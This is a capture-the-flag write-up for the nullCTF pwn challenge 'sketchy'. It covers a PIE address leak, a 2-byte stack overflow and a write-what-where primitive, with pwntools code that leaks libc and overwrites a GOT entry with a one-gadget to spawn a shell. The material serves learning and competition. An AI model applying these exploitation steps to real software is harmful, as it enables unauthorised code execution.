#import "../../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "sketchy",
    description: "Exploit writeup for 'sketchy', a pwn challenge from nullCTF",
    date: "2025-12-08",
    order: 14,
  ),
)<frontmatter>
= Sketchy Exploit Analysis

#html.a(
  href: "https://mega.nz/file/pbhX2DQR#SWTwkahOmMLhTrkcFpj3_yQa41NbT6Ja3je15KcZm-0",
  target: "_blank",
)[Download Challenge Files]

== Vulnerability Analysis

The binary contains three key vulnerabilities that can be combined to achieve remote code execution.

=== 1. Information Leak (PIE Bypass)

The program prints the address of one of its own functions at startup. This defeats Position-Independent Executable (PIE) protection by providing a reference point to calculate the binary's base address in memory.

```c
// The program prints the address of the main logic function
printf("welcome, gift for today: %p\n", FUN_00101265);
```

=== 2. Stack Buffer Overflow

A `read` call copies 58 bytes of user input into a 56-byte buffer on the stack. This allows for a 2-byte overflow, which can be used to partially overwrite an adjacent variable on the stack.

```c
// A 56-byte buffer is allocated on the stack
char local_48 [56];

// 58 bytes (0x3a) are read into the 56-byte buffer, causing an overflow
read(0, local_48, 0x3a);
```

=== 3. Arbitrary Write

The program first reads a hexadecimal address from the user and stores it in a pointer. It then reads a small number of bytes from the user and writes them to that stored address. This provides a "write-what-where" primitive.

```c
// A pointer to store the destination address
code *local_50;

// The program reads a hex value from the user into the pointer
__isoc23_scanf("%lx", &local_50);

// The program reads 5 bytes and writes them to the user-supplied address
fgets((char *)local_50, 5, stdin);
```

== The Exploitation Strategy

The exploit proceeds in three main steps, presented here with corrected and clarified code.

=== Step 1: Defeating PIE

The initial address leak is captured and used to calculate the binary's base address. This allows for reliable calculation of internal addresses, such as the Global Offset Table (GOT).

```python
# Wait for the prompt and receive the leaked address
p.recvuntil(b"today: ")
leak = int(p.recvline().strip(), 16)
log.info(f"Leaked function address: {hex(leak)}")

# Calculate the ELF base address by subtracting the function's known offset
exe.address = leak - 0x1265
log.info(f"Calculated EXE base: {hex(exe.address)}")
```

=== Step 2: Leaking the Libc Address

The stack buffer overflow is used to trick the program into leaking an address from the `libc` library.

1. *Crafting the Payload:* A payload is created to fill the 56-byte buffer and overflow by 2 bytes. These 2 bytes are the least significant bytes of the address of the `puts` function in the GOT. A null byte is included early to bypass a `strlen` check in the binary.

  ```python
  # The payload fills the buffer and overflows 2 bytes to overwrite a pointer.
  # The target is the GOT entry for `puts`.
  payload = b"a\0".ljust(56, b"a") + p64(exe.got["puts"])[0:2]
  p.sendline(payload)
  ```

2. *Triggering the Leak:* The overflow overwrites a pointer on the stack that is subsequently used in a `puts` call. Instead of printing its original string, it now prints the content of the `puts` GOT entry, which is the resolved runtime address of `puts` in `libc`.

  ```c
  // This call now prints the libc address of puts, not the original string
  puts(local_10);
  ```

3. *Calculating Libc Base:* The leaked `puts` address is captured, and by subtracting the known offset of `puts` within its library, the base address of `libc` is found.

  ```python
  # Read the leaked address and pad it to 8 bytes
  leak = u64(p.recvline().strip().ljust(8, b"\0"))
  log.info(f"Leaked puts@libc address: {hex(leak)}")

  # Calculate the libc base address
  libc.address = leak - libc.sym["puts"]
  log.info(f"Calculated libc base: {hex(libc.address)}")
  ```

=== Step 3: Achieving Code Execution

The arbitrary write vulnerability is used to hijack control flow.

1. *Finding a "One-Gadget":* A "one-gadget" is a single address in `libc` that, when executed, spawns a shell. A reliable gadget with simple constraints is chosen.

  ```
  # Gadget from libc that executes execve("/bin/sh", ...)
  # Constraints: rbx == NULL, r12 == NULL
  0xEF4CE
  ```

2. *Setting the Target:* The exploit sends the address of the `puts` GOT entry as a string. The `scanf` in the binary reads this and sets its internal pointer (`local_50`) to this target address.

  ```python
  # Send the address of puts@got.plt for scanf to read
  p.sendline(hex(exe.got["puts"]).encode())
  ```

3. *Writing the Payload:* The exploit calculates the runtime address of the one-gadget and sends its 3 least significant bytes. Crucially, `send()` is used instead of `sendline()` to avoid sending a corrupting newline character.

  ```python
  # Calculate the one-gadget's runtime address
  one_gadget_addr = libc.address + 0xEF4CE

  # Send the 3 LSBs of the address for fgets to write into the GOT.
  # Use send() to avoid adding a newline.
  p.send(p64(one_gadget_addr)[:3])
  ```

Now, the next time the program calls `puts`, it will instead jump to the one-gadget, and a shell will be executed.

== Auxiliary Mechanism: The Timeout

The challenge includes a time limit.

- *Server-Side Alarm:* The binary sets a 100-second alarm at startup. If the program is still running after 100 seconds, it will be terminated.

  ```assembly
  ; mov $0x64, %edi  (0x64 is 100)
  ; call alarm@plt
  mov    $0x64,%edi
  call   1050 <alarm@plt>
  ```

- *Client-Side Wait:* The exploit script waits for over 100 seconds to allow time for the shell to connect and to outlast the server's alarm.

  ```python
  # Wait for the alarm to be close to triggering
  for i in range(102):
      log.info(f"Waiting for shell... {i}/101")
      sleep(1)

  # Switch to interactive mode to use the shell
  p.interactive()
  ```
